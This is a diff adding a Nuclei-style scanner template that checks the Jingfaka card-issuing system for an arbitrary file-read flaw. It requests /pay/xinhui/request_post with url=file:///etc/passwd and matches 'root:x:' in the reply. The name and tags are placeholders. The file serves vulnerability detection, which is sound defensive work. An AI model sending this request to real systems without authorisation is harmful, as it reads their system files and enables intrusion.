@@ -1,0 +1,18 @@
+id: maowang51-request-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 鲸发卡系统是一款专业的虚拟商品寄售系统，支持多种功能和模式，为商户和买家提供便捷、绿色、安全、快速的销售和购买体验。本文档介绍了鲸发卡系统的特色功能、客户案例.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%B2%B8%E5%8F%91%E5%8D%A1%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E5%8F%91%E5%8D%A1%E7%BD%91request_post%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]=aaa"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:'
